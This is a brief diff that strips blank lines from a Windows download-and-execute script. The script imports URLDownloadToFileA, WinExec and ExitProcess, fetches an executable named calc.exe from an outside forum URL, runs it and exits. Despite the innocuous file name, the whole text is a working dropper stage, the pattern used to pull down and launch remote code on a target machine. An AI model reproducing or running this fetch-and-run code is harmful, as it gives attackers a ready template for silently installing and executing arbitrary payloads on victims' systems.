@@ -1,15 +1,7 @@
-
 function URLDownloadToFileA("urlmon.dll");
-
 function WinExec("kernel32.dll");
-
 function ExitProcess("kernel32.dll");
 
-
-
 URLDownloadToFileA(0,"https://rstforums.com/fisiere/calc.exe","calc.exe",0,0);
-
 WinExec("calc.exe",0);
-
 ExitProcess(0);
-
